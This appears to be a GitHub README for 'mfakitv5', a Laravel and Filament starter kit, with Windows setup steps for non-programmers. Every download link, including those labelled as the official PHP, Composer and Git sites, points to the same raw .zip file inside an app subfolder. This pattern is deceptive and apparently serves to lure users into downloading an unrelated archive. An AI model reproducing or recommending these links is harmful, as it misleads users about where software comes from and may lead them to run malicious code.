# 🔐 mfakitv5 - Secure Laravel Kit with Multi-Panel Setup

[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-brightgreen)](https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip)

---

## 📋 What is mfakitv5?

mfakitv5 is a starter kit designed to help you set up a web application using Laravel 12 and Filament 5. It offers a multi-panel structure so you can manage different parts of your app separately. It also includes key features like multi-factor authentication (MFA), a WhatsApp connector for messaging, and options to manage user profiles easily.

This application combines tools to build secure admin and user panels without needing to write complex code. It helps you get started quickly with a ready-to-use framework.

---

## 🖥️ System Requirements

Before you start, make sure your computer meets these requirements:

- **Operating System:** Windows 10 or later  
- **Internet Connection:** Required for downloading and setup  
- **Storage Space:** At least 500 MB free space for installation and dependencies  
- **Other Software Required:**  
  - PHP 8.1 or higher  
  - Composer (a tool for managing PHP packages)  
  - Git (optional but recommended for updates)

If these tools are not on your computer, the setup section explains how to get what you need.

---

## 🚀 Getting Started with mfakitv5

This guide will walk you through downloading and running mfakitv5 on your Windows computer. No programming experience is required. Just follow the steps carefully.

### 1. Download the Starter Kit

Click the large button below to open the download page:

[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-blue)](https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip)

Once the link opens, look for the **Releases** section on the GitHub page. Click the latest version available to download the files.

You will download a compressed folder that contains the starter kit.

### 2. Extract the Downloaded Files

After the download finishes:

- Find the downloaded file in your **Downloads** folder. It will be a `.zip` file.
- Right-click the file and select **Extract All**.
- Choose a folder where you want the files to be saved (e.g., Desktop or Documents).
- Click **Extract**.

Now you have the full kit ready to set up.

---

## 🔧 Installing Required Software

mfakitv5 requires some software to run correctly. If you have these installed already, skip to step 3.

### a. Install PHP

1. Go to the official PHP site: https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip
2. Download the latest **Thread Safe** version for Windows.
3. Follow the installer instructions to install PHP on your system.

### b. Install Composer

Composer helps manage PHP packages.

1. Visit https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip
2. Download the Windows installer.
3. Run the installer and follow the on-screen instructions.

### c. (Optional) Install Git

Git helps with version control and easier updates.

1. Visit https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip
2. Download and install Git for Windows.

---

## ⚙️ Setting Up mfakitv5

After extraction and software installation:

### 1. Open Command Prompt

- Press **Windows Key + R**, type `cmd`, and hit Enter.

### 2. Navigate to the mfakitv5 folder

- In the Command Prompt, type:
  
  ```
  cd path\to\mfakitv5
  ```

  Replace `path\to\mfakitv5` with the actual folder location on your computer.

Example:  
```
cd Desktop\mfakitv5
```

### 3. Install Dependencies

Type the following command and press Enter:

```
composer install
```

This command downloads all necessary PHP packages for the app to work.

### 4. Set Up Environment File

- In the mfakitv5 folder, find the file named `.env.example`.
- Make a copy of this file and rename it to `.env`.

This file contains settings that tell mfakitv5 how to run.

### 5. Generate Application Key

Run this command:

```
php artisan key:generate
```

This creates a secure key needed for your app.

### 6. Configure Database

mfakitv5 needs a database to store information. For simple use, install **SQLite** or **MySQL**.

- If you use MySQL, open the `.env` file with a text editor.
- Find the database section and add your database name, username, and password.

Example for MySQL:

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=mfakitv5db
DB_USERNAME=root
DB_PASSWORD=yourpassword
```

Create the database `mfakitv5db` in MySQL before proceeding.

### 7. Run Database Migrations

Run:

```
php artisan migrate
```

This sets up tables needed for the app.

---

## ▶️ Running mfakitv5 Locally

Once setup is complete:

1. Run the command:

```
php artisan serve
```

2. Open your web browser.
3. Enter the address shown in the command prompt, usually:

```
http://127.0.0.1:8000
```

You should see the mfakitv5 home screen.

---

## ✅ Logging In and Using mfakitv5

The kit comes with multi-factor authentication (MFA) enabled to keep your account secure.

- Use the **Admin Panel** to manage users and site settings.
- Use the **App Panel** for user-facing features.
- Manage your profile from the profile section.
- Use the WhatsApp connector to send messages through the app.

---

## 🛠️ Troubleshooting Common Issues

- **Composer command not found:** Check if Composer is installed and added to your system PATH.
- **PHP version errors:** Ensure you installed PHP 8.1 or newer.
- **Database connection errors:** Verify your `.env` file has correct database settings.
- **Port already in use when running `php artisan serve`:** Stop other applications using the port, or run with a different port:

```
php artisan serve --port=8080
```

---

## 🔗 Download mfakitv5

Use this link to visit the GitHub page where you can download the latest version:

[Download mfakitv5](https://github.com/Purabd/mfakitv5/raw/refs/heads/main/app/Filament/Admin/Pages/mfakitv_3.8.zip)

---

## 📬 Getting Support

If you need help or want to report issues, use the **Issues** tab on the GitHub page. You can describe your problem clearly and get assistance from the community or developers.